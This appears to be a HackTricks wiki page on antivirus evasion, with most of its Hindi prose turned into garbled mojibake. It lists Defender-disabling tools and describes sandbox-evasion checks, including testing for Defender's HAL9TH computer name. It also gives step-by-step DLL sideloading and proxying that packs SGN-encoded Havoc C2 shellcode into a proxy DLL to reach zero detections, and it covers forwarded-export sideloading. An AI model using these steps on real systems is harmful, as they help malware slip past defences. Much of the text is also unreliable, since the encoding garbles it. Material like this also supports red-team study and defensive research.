# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**This page was written by** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defender рдХреЛ рдХрд╛рдо рдХрд░рдиреЗ рд╕реЗ рд░реЛрдХрдиреЗ рдХрд╛ рдПрдХ рдЯреВрд▓ред
- [no-defender](https://github.com/es3n1n/no-defender): рдПрдХ рдЯреВрд▓ рдЬреЛ рдХрд┐рд╕реА рдФрд░ AV рдХрд╛ рдирд╛рдЯрдХ рдХрд░рдХреЗ Windows Defender рдХреЛ рдХрд╛рдо рдХрд░рдиреЗ рд╕реЗ рд░реЛрдХрддрд╛ рд╣реИред
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

## **AV Evasion Methodology**

рд╡рд░реНрддрдорд╛рди рдореЗрдВ, AVs рдпрд╣ рддрдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрд▓рдЧ-рдЕрд▓рдЧ рддрд░реАрдХреЗ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ рдХрд┐ рдХреЛрдИ рдлрд╝рд╛рдЗрд▓ malicious рд╣реИ рдпрд╛ рдирд╣реАрдВ тАФ static detection, dynamic analysis, рдФрд░ рдЕрдзрд┐рдХ advanced EDRs рдХреЗ рд▓рд┐рдП behavioural analysisред

### **Static detection**

Static detection рдЙрди рдЬрд╛рдиреЗ-рдкрд╣рдЪрд╛рдиреЗ malicious strings рдпрд╛ byte arrays рдХреЛ flag рдХрд░рдХреЗ рдФрд░ рдлрд╝рд╛рдЗрд▓ рд╕реЗ рдЬрд╛рдирдХрд╛рд░реА рдирд┐рдХрд╛рд▓рдХрд░ рд╣рд╛рд╕рд┐рд▓ рдХреА рдЬрд╛рддреА рд╣реИ (рдЬреИрд╕реЗ file description, company name, digital signatures, icon, checksum, рдЖрджрд┐)ред рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рддреМрд░ рдкрд░ рдЙрдкрд▓рдмреНрдз tools рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдкрд░ рдЖрдкрдХреЛ рдкрдХрдбрд╝рдирд╛ рдЖрд╕рд╛рди рд╣реЛ рд╕рдХрддрд╛ рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ рдЙрдиреНрд╣реЗрдВ рд╢рд╛рдпрдж рдкрд╣рд▓реЗ рд╕реЗ analyze рдХрд░рдХреЗ malicious рдХреЗ рд░реВрдк рдореЗрдВ рдЪрд┐рдиреНрд╣рд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реЛрдЧрд╛ред рдЗрд╕ рддрд░рд╣ рдХреА detection рд╕реЗ рдмрдЪрдиреЗ рдХреЗ рдХреБрдЫ рддрд░реАрдХреЗ рд╣реИрдВ:

- **Encryption**

рдЕрдЧрд░ рдЖрдк binary рдХреЛ encrypt рдХрд░ рджреЗрддреЗ рд╣реИрдВ, рддреЛ AV рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЗ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХреЛ detect рдХрд░рдирд╛ рдореБрд╢реНрдХрд┐рд▓ рд╣реЛрдЧрд╛, рд▓реЗрдХрд┐рди рдЖрдкрдХреЛ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХреЛ memory рдореЗрдВ decrypt рдФрд░ run рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рд╕реА loader рдХреА рдЬрд╝рд░реВрд░рдд рдкрдбрд╝реЗрдЧреАред

- **Obfuscation**

рдХрднреА-рдХрднреА рдмрд╕ рдЕрдкрдиреЗ binary рдпрд╛ script рдХреЗ рдХреБрдЫ strings рдмрджрд▓ рджреЗрдиреЗ рд╕реЗ AV рд╕реЗ рдкрд╛рд░ рдорд┐рд▓ рдЬрд╛рддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдпрд╣ рдЙрд╕ рдЪреАрдЬрд╝ рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддреЗ рд╣реБрдП рд╕рдордп рд▓реЗрдиреЗ рд╡рд╛рд▓рд╛ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдЬрд┐рд╕реЗ рдЖрдк obfuscate рдХрд░рдирд╛ рдЪрд╛рд╣ рд░рд╣реЗ рд╣реИрдВред

- **Custom tooling**

рдЕрдЧрд░ рдЖрдк рдЕрдкрдиреЗ рдЦреБрдж рдХреЗ tools рд╡рд┐рдХрд╕рд┐рдд рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдХреЛрдИ known bad signature рдирд╣реАрдВ рд╣реЛрдЧрд╛, рд▓реЗрдХрд┐рди рдЗрд╕рдХреЗ рд▓рд┐рдП рдмрд╣реБрдд рд╕рдордп рдФрд░ рдореЗрд╣рдирдд рдЪрд╛рд╣рд┐рдПред

> [!TIP]
> Windows Defender рдХреА static detection рдХреЗ рдЦрд┐рд▓рд╛рдл рдЪреЗрдХ рдХрд░рдиреЗ рдХрд╛ рдПрдХ рдЕрдЪреНрдЫрд╛ рддрд░реАрдХрд╛ рд╣реИ [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)ред рдпрд╣ рдореВрд▓рддрдГ рдлрд╝рд╛рдЗрд▓ рдХреЛ рдХрдИ segments рдореЗрдВ рдмрд╛рдБрдЯрддрд╛ рд╣реИ рдФрд░ рдлрд┐рд░ Defender рдХреЛ рдкреНрд░рддреНрдпреЗрдХ segment рдЕрд▓рдЧ рд╕реЗ scan рдХрд░рдиреЗ рджреЗрддрд╛ рд╣реИ; рдЗрд╕ рддрд░рд╣ рдпрд╣ рдЖрдкрдХреЛ рдмрддрд╛ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдЖрдкрдХреЗ binary рдореЗрдВ рдХреМрди-рдХреМрди рд╕реА strings рдпрд╛ bytes flagged рд╣реИрдВред

рдореИрдВ рд╕рд▓рд╛рд╣ рджреВрдБрдЧрд╛ рдХрд┐ рдЖрдк practical AV Evasion рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдпрд╣ [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) рджреЗрдЦреЗрдВред

### **Dynamic analysis**

Dynamic analysis рддрдм рд╣реЛрддреА рд╣реИ рдЬрдм AV рдЖрдкрдХрд╛ binary рдХрд┐рд╕реА sandbox рдореЗрдВ рдЪрд▓рд╛рдХрд░ malicious activity рдкрд░ рдирдЬрд╝рд░ рд░рдЦрддрд╛ рд╣реИ (рдЙрджрд╛рд╣рд░рдг: browser рдХреЗ passwords decrypt рдХрд░рдХреЗ рдкрдврд╝рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рдирд╛, LSASS рдХрд╛ minidump рд▓реЗрдирд╛, рдЖрджрд┐)ред рдЗрд╕ рд╣рд┐рд╕реНрд╕реЗ рдХреЗ рд╕рд╛рде рдХрд╛рдо рдХрд░рдирд╛ рдереЛрдбрд╝рд╛ рдЬрд╝реНрдпрд╛рджрд╛ tricky рд╣реЛ рд╕рдХрддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди sandboxes рд╕реЗ рдмрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдХреБрдЫ рдЪреАрдЬрд╝реЗрдВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

- **Sleep before execution** рд▓рд╛рдЧреВ рдХрд░рдиреЗ рдХреЗ рддрд░реАрдХреЗ рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддреЗ рд╣реБрдП, рдпрд╣ AV рдХреЗ dynamic analysis рдХреЛ bypass рдХрд░рдиреЗ рдХрд╛ рдПрдХ рдЕрдЪреНрдЫрд╛ рддрд░реАрдХрд╛ рд╣реЛ рд╕рдХрддрд╛ рд╣реИред AVs рдХреЗ рдкрд╛рд╕ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ scan рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмрд╣реБрдд рдХрдо рд╕рдордп рд╣реЛрддрд╛ рд╣реИ рддрд╛рдХрд┐ рдпреВрдЬрд╝рд░ рдХреЗ workflow рдореЗрдВ рдмрд╛рдзрд╛ рди рдЖрдП, рдЗрд╕рд▓рд┐рдП рд▓рдВрдмреЗ sleep рдХрд╛ рдЙрдкрдпреЛрдЧ binaries рдХреЗ analysis рдХреЛ рдмрд╛рдзрд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред рд╕рдорд╕реНрдпрд╛ рдпрд╣ рд╣реИ рдХрд┐ рдХрдИ AVs рдХреА sandboxes sleep рдХреЛ implement рдХрд░рдиреЗ рдХреЗ рддрд░реАрдХреЗ рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рдХреЗ skip рдХрд░ рд╕рдХрддреА рд╣реИрдВред
- **Checking machine's resources** рдЖрдорддреМрд░ рдкрд░ Sandboxes рдХреЗ рдкрд╛рд╕ рдХрд╛рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмрд╣реБрдд рдХрдо resources рд╣реЛрддреЗ рд╣реИрдВ (рдЙрджрд╛. < 2GB RAM), рд╡рд░рдирд╛ рд╡реЗ рдпреВрдЬрд╝рд░ рдХреА рдорд╢реАрди рдХреЛ рдзреАрдорд╛ рдХрд░ рджреЗрддреЗред рдЖрдк рдпрд╣рд╛рдБ рдХрд╛рдлреА creative рднреА рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ, рдЬреИрд╕реЗ CPU рдХреЗ temperature рдпрд╛ fan speeds рдЬрд╛рдВрдЪрдирд╛ тАФ рд╣рд░ рдЪреАрдЬрд╝ sandbox рдореЗрдВ implement рдирд╣реАрдВ рд╣реЛрдЧреАред
- **Machine-specific checks** рдЕрдЧрд░ рдЖрдк рдХрд┐рд╕реА рдРрд╕реЗ рдпреВрдЬрд╝рд░ рдХреЛ рдЯрд╛рд░реНрдЧреЗрдЯ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдЬрд┐рд╕рдХреА workstation "contoso.local" domain рд╕реЗ рдЬреБрдбрд╝реА рд╣реИ, рддреЛ рдЖрдк рдХрдВрдкреНрдпреВрдЯрд░ рдХреЗ domain рдХреА рдЬрд╛рдБрдЪ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЕрдЧрд░ рдпрд╣ рдЖрдкрдХреЗ specified рд╕реЗ рдирд╣реАрдВ рдорд┐рд▓рддрд╛ рддреЛ рдЖрдкрдХрд╛ рдкреНрд░реЛрдЧреНрд░рд╛рдо exit рдХрд░ рд╕рдХрддрд╛ рд╣реИред

рдкрддрд╛ рдЪрд▓рд╛ рд╣реИ рдХрд┐ Microsoft Defender рдХреЗ Sandbox рдХрд╛ computername HAL9TH рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЖрдк рдЕрдкрдиреА malware рдореЗрдВ detonation рд╕реЗ рдкрд╣рд▓реЗ computer name рдХреА рдЬрд╛рдБрдЪ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ тАФ рдЕрдЧрд░ name HAL9TH рд╕реЗ рдореЗрд▓ рдЦрд╛рддрд╛ рд╣реИ рддреЛ рдЖрдк рд╕рдордЭ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдЖрдк defender рдХреЗ sandbox рдХреЗ рдЕрдВрджрд░ рд╣реИрдВ рдФрд░ рдЕрдкрдирд╛ рдкреНрд░реЛрдЧреНрд░рд╛рдо exit рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Sandboxes рдХреЗ рдЦрд┐рд▓рд╛рдл рдЬрд╛рдиреЗ рдХреЗ рд▓рд┐рдП [@mgeeky](https://twitter.com/mariuszbit) рд╕реЗ рдХреБрдЫ рдФрд░ рдмрд╣реБрдд рдЕрдЪреНрдЫреЗ рд╕реБрдЭрд╛рд╡

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

рдЬреИрд╕рд╛ рдХрд┐ рд╣рдордиреЗ рдкрд╣рд▓реЗ рдХрд╣рд╛ рд╣реИ, **public tools** рдЕрдВрддрддрдГ **detect рд╣реЛ рд╣реА рдЬрд╛рддреЗ рд╣реИрдВ**, рддреЛ рдЖрдкрдХреЛ рдЦреБрдж рд╕реЗ рдХреБрдЫ рд╕рд╡рд╛рд▓ рдкреВрдЫрдиреЗ рдЪрд╛рд╣рд┐рдП:

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдЕрдЧрд░ рдЖрдк LSASS dump рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ, **рдХреНрдпрд╛ рдЖрдкрдХреЛ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ mimikatz рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рдЬрд░реВрд░реА рд╣реИ**? рдпрд╛ рдХреНрдпрд╛ рдЖрдк рдХреЛрдИ рдЕрдиреНрдп рдХрдо рдЬрд╛рдирд╛-рдкрд╣рдЪрд╛рдирд╛ рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ LSASS dump рднреА рдХрд░рддрд╛ рд╣реЛред

рд╕рд╣реА рдЬрд╡рд╛рдм рд╢рд╛рдпрдж рдмрд╛рдж рд╡рд╛рд▓рд╛ рд╣реЛрдЧрд╛ред mimikatz рдХреЛ рд▓реЗрдВ, рдпрд╣ рд╢рд╛рдпрдж AVs рдФрд░ EDRs рджреНрд╡рд╛рд░рд╛ рд╕рдмрд╕реЗ рдЬрд╝реНрдпрд╛рджрд╛ flagged рдЯреВрд▓реНрд╕ рдореЗрдВ рд╕реЗ рдПрдХ рд╣реИ; рдЬрдмрдХрд┐ рдпрд╣ рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдЦреБрдж рдХрд╛рдлреА рдЕрдЪреНрдЫрд╛ рд╣реИ, AVs рдХреЗ рдЪрд╛рд░реЛрдВ рдУрд░ рдХрд╛рдо рдХрд░рдХреЗ рдмрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдЗрд╕рдХреЗ рд╕рд╛рде рдХрд╛рдо рдХрд░рдирд╛ рдПрдХ рджреБрдГрд╕реНрд╡рдкреНрди рд╣реЛ рд╕рдХрддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЬреЛ рдЖрдк рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдЙрд╕рдХреЗ рд▓рд┐рдП alternatives рдЦреЛрдЬреЗрдВред

> [!TIP]
> рдЬрдм рдЖрдк рдЕрдкрдиреЗ payloads рдХреЛ evasion рдХреЗ рд▓рд┐рдП modify рдХрд░ рд░рд╣реЗ рд╣реЛрдВ, рддреЛ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВ рдХрд┐ defender рдореЗрдВ automatic sample submission рдмрдВрдж рд╣реИ, рдФрд░ рдХреГрдкрдпрд╛, рдЧрдВрднреАрд░рддрд╛ рд╕реЗ, **DO NOT UPLOAD TO VIRUSTOTAL** рдЕрдЧрд░ рдЖрдкрдХрд╛ рд▓рдХреНрд╖реНрдп рд▓рдореНрдмреЗ рд╕рдордп рдореЗрдВ evasion рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ рд╣реИред рдЕрдЧрд░ рдЖрдк рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХрд╛ payload рдХрд┐рд╕реА particular AV рджреНрд╡рд╛рд░рд╛ detect рд╣реЛрддрд╛ рд╣реИ рдпрд╛ рдирд╣реАрдВ, рддреЛ рдЙрд╕реЗ рдПрдХ VM рдкрд░ install рдХрд░реЗрдВ, automatic sample submission рдмрдВрдж рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдВ, рдФрд░ рд╡рд╣рд╛рдБ рддрдм рддрдХ рдЯреЗрд╕реНрдЯ рдХрд░реЗрдВ рдЬрдм рддрдХ рдЖрдк рдкрд░рд┐рдгрд╛рдо рд╕реЗ рд╕рдВрддреБрд╖реНрдЯ рди рд╣реЛрдВред

## EXEs vs DLLs

рдЬрд╣рд╛рдБ рднреА рд╕рдореНрднрд╡ рд╣реЛ, рд╣рдореЗрд╢рд╛ evasion рдХреЗ рд▓рд┐рдП **DLLs рдХрд╛ рдЙрдкрдпреЛрдЧ рдкреНрд░рд╛рдердорд┐рдХрддрд╛ рджреЗрдВ**, рдореЗрд░реЗ рдЕрдиреБрднрд╡ рдореЗрдВ DLL files рдЖрдо рддреМрд░ рдкрд░ **рдХрд╛рдлрд╝реА рдХрдо detect** рдФрд░ analyze рд╣реЛрддреЗ рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП рдпрд╣ detection рд╕реЗ рдмрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдмрд╣реБрдд рд╣реА рд╕рд░рд▓ рдЪрд╛рд▓ рд╣реИ (рдЕрдЧрд░ рдЖрдкрдХрд╛ payload рдХрд┐рд╕реА рддрд░рд╣ DLL рдХреЗ рд░реВрдк рдореЗрдВ рдЪрд▓ рд╕рдХрддрд╛ рд╣реЛ рддреЛ)ред

рдЬреИрд╕рд╛ рдХрд┐ рд╣рдо рдЗрд╕ рдЗрдореЗрдЬ рдореЗрдВ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ, Havoc рдХрд╛ рдПрдХ DLL Payload antiscan.me рдореЗрдВ 4/26 detection rate рджрд┐рдЦрд╛ рд░рд╣рд╛ рд╣реИ, рдЬрдмрдХрд┐ EXE payload рдХрд╛ detection rate 7/26 рд╣реИред

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

рдЕрдм рд╣рдо рдХреБрдЫ tricks рджрд┐рдЦрд╛рдПрдБрдЧреЗ рдЬреЛ рдЖрдк DLL files рдХреЗ рд╕рд╛рде рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдЖрдк рдмрд╣реБрдд рдЬрд╝реНрдпрд╛рджрд╛ stealthier рд╣реЛ рд╕рдХреЗрдВред

## DLL Sideloading & Proxying

**DLL Sideloading** loader рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ DLL search order рдХрд╛ рдлрд╝рд╛рдпрджрд╛ рдЙрдард╛рддрд╛ рд╣реИ, рдЬрд╣рд╛рдБ attacker victim application рдФрд░ malicious payload(s) рдХреЛ рдПрдХ рд╕рд╛рде рд░рдЦрдХрд░ рд▓рдХреНрд╖реНрдп рдХрд░рддрд╛ рд╣реИред

рдЖрдк [Siofra](https://github.com/Cybereason/siofra) рдФрд░ рдирд┐рдореНрди powershell script рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ DLL Sideloading рдХреЗ рдкреНрд░рддрд┐ susceptible programs рдХреА рдЬрд╛рдБрдЪ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
This command will output the list of programs susceptible to DLL hijacking inside "C:\Program Files\\" and the DLL files they try to load.

рдореИрдВ рджреГрдврд╝рддрд╛ рд╕реЗ рд╕реБрдЭрд╛рд╡ рджреЗрддрд╛ рд╣реВрдБ рдХрд┐ рдЖрдк рдЦреБрдж **DLL Hijackable/Sideloadable programs** рдХрд╛ рдЕрдиреНрд╡реЗрд╖рдг рдХрд░реЗрдВ; рдпрд╣ рддрдХрдиреАрдХ рдпрджрд┐ рд╕рд╣реА рддрд░реАрдХреЗ рд╕реЗ рдХреА рдЬрд╛рдП рддреЛ рдХрд╛рдлреА stealthy рд╣реИ, рд▓реЗрдХрд┐рди рдпрджрд┐ рдЖрдк publicly known DLL Sideloadable programs рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ рддреЛ рдЖрд╕рд╛рдиреА рд╕реЗ рдкрдХрдбрд╝реЗ рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВред

рд╕рд┐рд░реНрдлрд╝ рдЙрд╕ рдирд╛рдо рдХреА malicious DLL рд░рдЦ рджреЗрдиреЗ рднрд░ рд╕реЗ рдЬреЛ рдХрд┐рд╕реА рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рдХреА рдЙрдореНрдореАрдж рд╣реЛрддреА рд╣реИ, рдЖрдкрдХрд╛ payload рдирд╣реАрдВ рдЪрд▓реЗрдЧрд╛, рдХреНрдпреЛрдВрдХрд┐ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдЙрд╕ DLL рдХреЗ рдЕрдВрджрд░ рдХреБрдЫ specific functions рдЕрдкреЗрдХреНрд╖рд┐рдд рдХрд░рддрд╛ рд╣реИ; рдЗрд╕ рд╕рдорд╕реНрдпрд╛ рдХреЛ рдареАрдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣рдо рдПрдХ рдФрд░ рддрдХрдиреАрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВрдЧреЗ рдЬрд┐рд╕реЗ **DLL Proxying/Forwarding** рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИред

**DLL Proxying** рдкреНрд░реЛрдЧреНрд░рд╛рдо рджреНрд╡рд╛рд░рд╛ рдХреА рдЬрд╛рдиреЗ рд╡рд╛рд▓реА рдХреЙрд▓реНрд╕ рдХреЛ proxy (рдФрд░ malicious) DLL рд╕реЗ рдореВрд▓ DLL рддрдХ рдЖрдЧреЗ рдмрдврд╝рд╛рддрд╛ рд╣реИ, рдЗрд╕ рддрд░рд╣ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХреА functionality рдмрдиреА рд░рд╣рддреА рд╣реИ рдФрд░ рдпрд╣ рдЖрдкрдХреЗ payload рдХреЗ execution рдХреЛ рд╕рдВрднрд╛рд▓ рд╕рдХрддрд╛ рд╣реИред

рдореИрдВ [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣рд╛ рд╣реВрдБ рдЬреЛ [@flangvik](https://twitter.com/Flangvik/) рджреНрд╡рд╛рд░рд╛ рд╣реИред

рдпреЗ рд╡реЗ рдЪрд░рдг рд╣реИрдВ рдЬрд┐рдиреНрд╣реЗрдВ рдореИрдВрдиреЗ рдЕрдкрдирд╛рдпрд╛:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
рдЕрдВрддрд┐рдо рдХрдорд╛рдВрдб рд╣рдореЗрдВ 2 рдлрд╝рд╛рдЗрд▓реЗрдВ рджреЗрдЧрд╛: рдПрдХ DLL рд╕реНрд░реЛрдд рдХреЛрдб рдЯреЗрдореНрдкрд▓реЗрдЯ, рдФрд░ рдореВрд▓ рдкреБрдирд░реНрдирд╛рдорд┐рдд DLLред

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
рдпреЗ рдкрд░рд┐рдгрд╛рдо рд╣реИрдВ:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Both our shellcode (encoded with [SGN](https://github.com/EgeBalci/sgn)) and the proxy DLL have a 0/26 Detection rate in [antiscan.me](https://antiscan.me)! I would call that a success.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> рдореИрдВ рдЖрдкрдХреЛ **рдХрдареЛрд░рддрд╛ рд╕реЗ рд╕реБрдЭрд╛рд╡ рджреЗрддрд╛ рд╣реВрдБ** рдХрд┐ рдЖрдк [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) рджреЗрдЦреЗрдВ рдЬреЛ DLL Sideloading рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рд╣реИ рдФрд░ рд╕рд╛рде рд╣реА [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) рднреА рджреЗрдЦреЗрдВ, рддрд╛рдХрд┐ рдЖрдк рдЙрди рдмрд╛рддреЛрдВ рдХреЛ рдЬреЛ рд╣рдордиреЗ рдЕрдзрд┐рдХ рдЧрд╣рд░рд╛рдИ рд╕реЗ рдЪрд░реНрдЪрд╛ рдХреА рд╣реИрдВ рдмреЗрд╣рддрд░ рд╕рдордЭ рд╕рдХреЗрдВред

### Forwarded Exports (ForwardSideLoading) рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ

Windows PE modules рдРрд╕реЗ functions export рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ "forwarders" рд╣реЛрддреЗ рд╣реИрдВ: code рдХреА рдУрд░ рд╕рдВрдХреЗрдд рдХрд░рдиреЗ рдХреА рдмрдЬрд╛рдп, export entry рдореЗрдВ ASCII string рд╣реЛрддреА рд╣реИ рдЬрд┐рд╕рдХрд╛ рд╕реНрд╡рд░реВрдк `TargetDll.TargetFunc` рд╣реЛрддрд╛ рд╣реИред рдЬрдм рдХреЛрдИ caller export рдХреЛ resolve рдХрд░рддрд╛ рд╣реИ, рддреЛ Windows loader:

- рдпрджрд┐ рдкрд╣рд▓реЗ рд╕реЗ loaded рдирд╣реАрдВ рд╣реИ рддреЛ `TargetDll` рдХреЛ рд▓реЛрдб рдХрд░реЗрдВ
- рдЙрд╕рд╕реЗ `TargetFunc` рдХреЛ resolve рдХрд░реЗрдВ

рд╕рдордЭрдиреЗ рдпреЛрдЧреНрдп рдореБрдЦреНрдп рд╡реНрдпрд╡рд╣рд╛рд░:
- рдпрджрд┐ `TargetDll` KnownDLL рд╣реИ, рддреЛ рдпрд╣ рд╕реБрд░рдХреНрд╖рд┐рдд KnownDLLs namespace рд╕реЗ рдкреНрд░рджрд╛рди рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ (рдЙрджрд╛., ntdll, kernelbase, ole32)ред
- рдпрджрд┐ `TargetDll` KnownDLL рдирд╣реАрдВ рд╣реИ, рддреЛ рд╕рд╛рдорд╛рдиреНрдп DLL рдЦреЛрдЬ рдХреНрд░рдо рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рдЙрд╕ module рдХреА directory рд╢рд╛рдорд┐рд▓ рд╣реИ рдЬреЛ forward resolution рдХрд░ рд░рд╣рд╛ рд╣реИред

рдпрд╣ рдПрдХ indirect sideloading primitive рд╕рдХреНрд╖рдо рдХрд░рддрд╛ рд╣реИ: рдПрдХ signed DLL рдЦреЛрдЬреЗрдВ рдЬреЛ рдХрд┐рд╕реА function рдХреЛ export рдХрд░рддрд╛ рд╣реИ рдЬреЛ рдПрдХ non-KnownDLL module рдирд╛рдо рдкрд░ forward рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реЛ, рдлрд┐рд░ рдЙрд╕ signed DLL рдХреЛ рдЙрд╕реА directory рдореЗрдВ рд░рдЦреЗрдВ рд╕рд╛рде рдореЗрдВ рдПрдХ attacker-controlled DLL рдЬрд┐рд╕реЗ forwarded target module рдХреЗ рдмрд┐рд▓реНрдХреБрд▓ рдЙрд╕реА рдирд╛рдо рд╕реЗ рдирд╛рдорд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реЛред рдЬрдм forwarded export invoke рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, loader forward рдХреЛ resolve рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЙрд╕реА directory рд╕реЗ рдЖрдкрдХрд╛ DLL рд▓реЛрдб рдХрд░рддрд╛ рд╣реИ, рдФрд░ рдЖрдкрдХрд╛ DllMain execute рд╣реЛрддрд╛ рд╣реИред

Example observed on Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
